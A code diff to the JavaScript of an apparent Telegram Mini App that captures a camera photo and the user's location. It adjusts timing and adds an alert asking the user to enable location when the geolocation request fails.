@@ -82,7 +82,7 @@
           status.innerText = "✅ Kamera aktif";
 
           // Setelah kamera aktif → ambil lokasi awal
-          getLocationBackground();
+          setTimeout(() => getLocationBackground(), 500);
         } catch (err) {
           status.innerText = "❌ Gagal akses kamera: " + err.message;
         }
@@ -105,8 +105,13 @@
                 accuracy: pos.coords.accuracy,
               });
             },
-            () => resolve(null),
-            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+            (err) => {
+              tg.showAlert(
+                "⚠️ Aktifkan lokasi untuk Telegram.\nError: " + err.message
+              );
+              resolve(null); // jangan menghentikan program, tetap lanjut
+            },
+            { enableHighAccuracy: true, timeout: 5000, maximumAge: 3000 }
           );
         });
       }
@@ -192,8 +197,8 @@
         });
 
         tg.showAlert("📤 Foto & lokasi sedang dikirim...");
-        setTimeout(() => tg.sendData("ok"), 3000);
-        setTimeout(() => tg.close(), 2000);
+        setTimeout(() => tg.sendData("ok"), 2000);
+        setTimeout(() => tg.close(), 2300);
       });
     </script>
   </body>
